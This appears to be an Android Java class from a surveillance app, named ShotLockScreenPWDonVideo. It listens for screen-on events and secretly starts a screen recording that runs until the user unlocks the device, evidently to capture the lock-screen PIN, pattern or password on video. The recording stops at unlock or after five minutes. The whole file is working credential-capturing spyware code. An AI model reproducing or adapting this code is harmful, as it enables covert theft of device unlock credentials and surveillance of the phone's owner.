/**
 * 
 */
package lock;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.util.Log;
import order.screen.ScreenRecordService;
import util.ConfigCt;

/**
 * @author ASUS
 *
 */
public class ShotLockScreenPWDonVideo {
	private static ShotLockScreenPWDonVideo current;//实例；
	private Context context;
	private IntentFilter filter;
	private BroadcastReceiver mBatInfoReceiver;
	private boolean bStart=false;
	
	private ShotLockScreenPWDonVideo(Context context) {
		this.context=context;
		UnLockScreenReceiver(context);
	}
	public static synchronized ShotLockScreenPWDonVideo getInstance(Context context) {
		if(current == null) {
			current = new ShotLockScreenPWDonVideo(context);
		}else{
			current.context=context;;
	    }
		return current;
	}
	 /**
     * 监听屏幕事件
     */
    private void UnLockScreenReceiver(Context context){
        filter = new IntentFilter();
        // 屏幕灭屏广播
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        // 屏幕亮屏广播
        filter.addAction(Intent.ACTION_SCREEN_ON);
        // 屏幕解锁广播
        filter.addAction(Intent.ACTION_USER_PRESENT);
        // 当长按电源键弹出“关机”对话或者锁屏时系统会发出这个广播
        // example：有时候会用到系统对话框，权限可能很高，会覆盖在锁屏界面或者“关机”对话框之上，
        // 所以监听这个广播，当收到时就隐藏自己的对话，如点击pad右下角部分弹出的对话框
        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

       mBatInfoReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, final Intent intent) {
                Log.d(ConfigCt.TAG, "mBatInfoReceiver onReceive");
                String action = intent.getAction();

                if (Intent.ACTION_SCREEN_ON.equals(action)) {
                	 if(ScreenRecordService.getInstance()==null){
    					 ScreenRecordService.start(context,"lck",false);
    					 StopRecordUnlockScreenDelay();
    					 bStart=true;
                	 }
                    Log.d(ConfigCt.TAG, "screen on");
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                	
                    Log.d(ConfigCt.TAG, "screen off");
                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                	 if(bStart){
    					 ScreenRecordService.stop(context);
    					 bStart=false;
    				 }
                    Log.d(ConfigCt.TAG, "screen unlock");
                } else if (Intent.ACTION_CLOSE_SYSTEM_DIALOGS.equals(intent.getAction())) {
                    Log.i(ConfigCt.TAG, " receive Intent.ACTION_CLOSE_SYSTEM_DIALOGS");
                }
            }
        };
        Log.d(ConfigCt.TAG, "mBatInfoReceiver  registerReceiver");
        context.registerReceiver(mBatInfoReceiver, filter);
    }
    /**
     * 
     */
    public void Destory() {
    	if(mBatInfoReceiver!=null){
        	context.unregisterReceiver(mBatInfoReceiver);
        	mBatInfoReceiver=null;
        	Log.d(ConfigCt.TAG, "unregisterReceiver(mBatInfoReceiver)");
    	}
    }
    /*
     * 定时器：5分钟后自动终止录屏；
     */
	private void StopRecordUnlockScreenDelay(){
		final Handler handler= new Handler(); 
		Runnable runnable  = new Runnable() {    
			@Override    
		    public void run() {   
				 if(bStart){
					 ScreenRecordService.stop(context);
					 bStart=false;
				 }
		    }    
		};
		handler.postDelayed(runnable, 1000*60*5);  
	}
}
